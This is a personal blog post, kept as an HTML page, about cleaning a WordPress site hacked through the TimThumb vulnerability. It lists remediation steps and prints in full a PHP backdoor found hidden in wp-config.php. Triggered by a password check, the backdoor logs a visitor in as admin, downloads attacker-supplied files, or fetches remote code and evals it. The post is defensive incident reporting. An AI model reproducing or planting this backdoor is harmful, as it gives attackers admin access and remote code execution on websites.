<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Warning - Something's Not Right HereBlake Embrey
    </title>
    <link rel="alternate" href="http://localhost:8080/feed.xml" type="application/rss+xml" title="">
    <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Open+Sans:400italic,800italic,400,800">
    <link rel="stylesheet" href="/css/main.css">
  </head>
  <body>
    <nav class="nav">
      <div class="container cf">
        <ul class="links">
          <li><a href="/">home</a></li>
          <li><a href="http://twitter.com/blakeembrey">twitter</a></li>
          <li><a href="http://github.com/blakeembrey">github</a></li>
        </ul>
      </div>
    </nav>
    <main id="main" class="container">
      <div class="content">
        <header class="title">
          <h1>Warning - Something's Not Right Here</h1>
        </header>
        <article class="article"><p><img src="http://d.pr/i/Ap8y+" alt="Chrome is broken :/">

</p>
<p>About two days ago, I received a warning from Google saying my website has been exploited and hacked. Of course, the emails they sent I never received, so I didn’t realise I had an issue until about an hour ago. My first reaction was OMG, WTF! I knew it most likely had something to do with the recent TimThumb exploit, but I didn’t even know my theme had TimThumb included. I also looked at the Google diagnostic repost which it linked me to, which I found the malware related to <code>counter-wordpress.com</code>.

</p>
<p>First of all, I would advise running the script found at <a href="http://blog.sucuri.net/2011/08/timthumb-php-security-vulnerability-just-the-tip-of-the-iceberg.html">Sucuri</a>. Then, scan your site using the <a href="http://sitecheck.sucuri.net/scanner/">Sucuri Site Scanner</a> to find out which pages they have exploited and how. This is the best little site I have found for this, and I would definitely bookmark it for future refernce as well if I were you.

</p>
<p>Extremely quickly, I jumped to action. This is the exact steps I took and you can take too, to remove the exploits from your code:

</p>
<ol>
<li>Delete the following files:</li>
</ol>
<pre><code>wp-admin/upd.php
wp-content/upd.php</code></pre>
<ol>
<li>Log into WordPress admin and reinstall your WordPress version. We are focusing on these three files:</li>
</ol>
<pre><code>wp-settings.php
wp-includes/js/jquery/jquery.js
wp-includes/js/l10n.js</code></pre>
<ol>
<li>Open &quot;<code>wp-config.php</code>&quot; and look for anything that seems out of place. In mine, I found a script which appears to harvest login credentials/cookies, which found on the 2000 or so line. Above and a few thousand lines below were all blank:</li>
</ol>
<pre><code><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'pingnow'</span>])&amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'pass'</span>])){
<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'pass'</span>] == <span class="string">'19ca14e7ea6328a42e0eb13d585e4c22'</span>){
<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'pingnow'</span>]== <span class="string">'login'</span>){
<span class="variable">$user_login</span> = <span class="string">'admin'</span>;
<span class="variable">$user</span> = get_userdatabylogin(<span class="variable">$user_login</span>);
<span class="variable">$user_id</span> = <span class="variable">$user</span>->ID;
wp_set_current_user(<span class="variable">$user_id</span>, <span class="variable">$user_login</span>);
wp_set_auth_cookie(<span class="variable">$user_id</span>);
do_action(<span class="string">'wp_login'</span>, <span class="variable">$user_login</span>);
}
<span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">'pingnow'</span>]== <span class="string">'exec'</span>)&amp;&amp;(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'file'</span>]))){
<span class="variable">$ch</span> = curl_init(<span class="variable">$_GET</span>[<span class="string">'file'</span>]);
<span class="variable">$fnm</span> = md5(rand(<span class="number">0</span>,<span class="number">100</span>)).<span class="string">'.php'</span>;
<span class="variable">$fp</span> = fopen(<span class="variable">$fnm</span>, <span class="string">"w"</span>);
curl_setopt(<span class="variable">$ch</span>, CURLOPT_FILE, <span class="variable">$fp</span>);
curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
curl_setopt(<span class="variable">$ch</span>, CURLOPT_TIMEOUT, <span class="number">5</span>);
curl_exec(<span class="variable">$ch</span>);
curl_close(<span class="variable">$ch</span>);
fclose(<span class="variable">$fp</span>);
<span class="keyword">echo</span> <span class="string">"&lt;SCRIPT LANGUAGE="</span>JavaScript<span class="string">">location.href='$fnm';&lt;/SCRIPT>"</span>;
}
<span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">'pingnow'</span>]== <span class="string">'eval'</span>)&amp;&amp;(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'file'</span>]))){
<span class="variable">$ch</span> = curl_init(<span class="variable">$_GET</span>[<span class="string">'file'</span>]);
curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);
curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
curl_setopt(<span class="variable">$ch</span>, CURLOPT_TIMEOUT, <span class="number">5</span>);
<span class="variable">$re</span> = curl_exec(<span class="variable">$ch</span>);
curl_close(<span class="variable">$ch</span>);
<span class="keyword">eval</span>(<span class="variable">$re</span>);
}}}</code></pre>
<ol>
<li>In your theme, look for anywhere the TimThumb script may be storing the cached files. These are generally along the lines of:</li>
</ol>
<pre><code>wp-content/themes/theme-name/scripts/cache/external_{MD5Hash}.php
wp-content/themes/theme-name/temp/cache/external_{MD5Hash}.php</code></pre>
<p>If you found anything like the above, delete it straight away. If you&apos;re not sure, delete every file that isn’t an image.

</p>
<ol>
<li><p>Replace <code>timthumb.php</code> with the latest version found at <code>http://timthumb.googlecode.com/svn/trunk/timthumb.php</code>.</p>
</li>
<li><p>Change your MySQL and login password and update wp-config.php to correspond with the update.</p>
</li>
<li><p>Change the secret keys in <code>wp-config.php</code>.</p>
</li>
<li><p>Clear your browsers cache and cookies.</p>
</li>
<li><p>Empty any page caching plugins you may have enabled to push the updates through to your visitors.</p>
</li>
</ol>
<p>Throughout this, I also found a botting script and some spam black hat links. Make sure you scan your site using the <a href="http://sitecheck.sucuri.net/scanner/">Sucuri Site Scanner</a> once again to make sure you removed all the exploits. When you are sure you have removed everything, submit your site to Google for review. This can be done in the <code>Diagnostics -&gt; Malware</code> tab of your Google Webmaster account. To keep up with anymore potential exploits, I would recommend following their fantastic blog found at <a href="http://blog.sucuri.net/">blog.sucuri.net</a>.</p>
</article>
        <footer class="footer">- Blake Embrey</footer>
      </div>
    </main>
  </body>
</html>